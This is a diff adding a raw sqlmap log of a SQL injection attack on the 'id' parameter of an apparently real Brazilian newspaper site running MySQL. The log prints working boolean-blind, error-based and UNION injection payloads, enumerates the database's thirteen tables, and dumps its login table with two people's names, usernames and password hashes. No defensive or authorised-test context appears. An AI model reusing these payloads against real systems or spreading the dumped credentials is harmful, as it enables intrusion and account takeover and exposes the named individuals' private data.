@@ -1,0 +1,111 @@
+sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1576=1576
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 2822 FROM(SELECT COUNT(*),CONCAT(0x716a7a7171,(SELECT (ELT(2822=2822,1))),0x716a6a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=-7989 UNION ALL SELECT NULL,CONCAT(0x716a7a7171,0x4a624e63417548527356466e59586769536d6257587842514d765075496e7766737945466d756a79,0x716a6a6271)-- Ewxu
+    Vector:  UNION ALL SELECT NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] folhaind_jornal
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1576=1576
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 2822 FROM(SELECT COUNT(*),CONCAT(0x716a7a7171,(SELECT (ELT(2822=2822,1))),0x716a6a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=-7989 UNION ALL SELECT NULL,CONCAT(0x716a7a7171,0x4a624e63417548527356466e59586769536d6257587842514d765075496e7766737945466d756a79,0x716a6a6271)-- Ewxu
+    Vector:  UNION ALL SELECT NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: folhaind_jornal
+[13 tables]
++----------------+
+| assinantes     |
+| banner         |
+| destaque       |
+| edicoes        |
+| editorias      |
+| enquete        |
+| home           |
+| jornais        |
+| login          |
+| noticias       |
+| paginas        |
+| paginas_jornal |
+| respostas      |
++----------------+
+
+Database: folhaind_jornal
++----------------+---------+
+| Table          | Entries |
++----------------+---------+
+| noticias       | 306     |
+| paginas        | 10      |
+| editorias      | 9       |
+| edicoes        | 8       |
+| paginas_jornal | 6       |
+| banner         | 5       |
+| home           | 5       |
+| assinantes     | 4       |
+| jornais        | 3       |
+| destaque       | 2       |
+| login          | 2       |
+| respostas      | 2       |
+| enquete        | 1       |
++----------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1576=1576
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 2822 FROM(SELECT COUNT(*),CONCAT(0x716a7a7171,(SELECT (ELT(2822=2822,1))),0x716a6a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=-7989 UNION ALL SELECT NULL,CONCAT(0x716a7a7171,0x4a624e63417548527356466e59586769536d6257587842514d765075496e7766737945466d756a79,0x716a6a6271)-- Ewxu
+    Vector:  UNION ALL SELECT NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: folhaind_jornal
+Table: login
+[2 entries]
++----+----+----+----+----+----+----------------+------+-------------------------------------+-------------------+-------+
+| id | en | ad | ed | nt | ba | nome           | as   | senha                               | login             | ativo |
++----+----+----+----+----+----+----------------+------+-------------------------------------+-------------------+-------+
+| 1  | 1  | 1  | 1  | 1  | 1  | Marcos Giovani | 1    | 92ac5da2df1f3d924e9a8e3f826e2dad:cc | marcos            | 1     |
+| 4  | 1  | 1  | 1  | 1  | 1  | Gisiane        | 1    | a10cc8230b029eac4300c491f66f96eb:c2 | folhaindependente | NULL  |
++----+----+----+----+----+----+----------------+------+-------------------------------------+-------------------+-------+
+
